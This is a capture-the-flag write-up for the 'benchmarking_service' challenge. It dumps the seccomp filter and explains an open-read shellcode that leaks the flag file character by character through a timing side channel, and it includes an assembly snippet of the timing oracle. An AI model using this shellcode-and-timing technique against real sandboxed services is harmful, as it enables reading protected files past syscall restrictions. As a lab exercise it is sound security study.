# benchmarking_service

For this challenge both a binary and a `wrapper.py` script is provided. The binary is pretty simple, it reads a shellcode from stdin and executes it. The `wrapper.py` create a subprocess that runs the binary and sends the input to it, then prints the time it took to execute the shellcode. The challenge is that the subprocess has no stdout nor stderr, so we cannot execute any shellcode that prints something nor spawn a shell.

## What syscall can we use?

Using `seccomp-tools dump ./benchmarking_service` this is what we get:

```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000023  if (A == nanosleep) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

So we can use `read`, `write`, `open` and `nanosleep`. But `write` is useless since we have no stdout.

## Solution

The idea is to do a standard open-read exploit to read from the `/chall/flag` file. And then we can do a binary search on the time it takes to execute the shellcode to find the flag character by character. We could also use `nanosleep` to sleep for a certain amount of time that is proportional to the flag character, but I found that it was quite complex to setup the parameters for the `nanosleep` syscall, since we have to deal with structs.

### Binary Search Approach

At the end of a standard open-read shellcode I added this:

```c
    movzx   eax, BYTE PTR [rsi+%d]
    cmp     al, %d
    jne     .L2
    jmp     .L3
.L4: // char == flag[count]
    add     DWORD PTR [rbp-4], 1
.L3:
    cmp     DWORD PTR [rbp-4], 0x10000000
    jle     .L4
.L2:
    cmp al, %d
    jg  .L5
    jmp .L6
.L7:
    add     DWORD PTR [rbp-4], 1
.L5: // char > flag[count]
    cmp     DWORD PTR [rbp-4], 0x20000000
    jle .L7
.L6: // char < flag[count]
```

As we an see in this snippet there are %d placeholders. In fact this shellcode is sent many times to the service. The first %d refers to the `count` variable, that is the index of the character in the flag string. The other two are an integer representing an ASCII character.

Based on the time required to execute this shellcode we get if the character we are trying is greater or less than the flag character. Then we can do a binary search to find the flag character.

I used loops to simulate the `nanosleep` syscall.

The complete exploit is in [script.py](script.py).
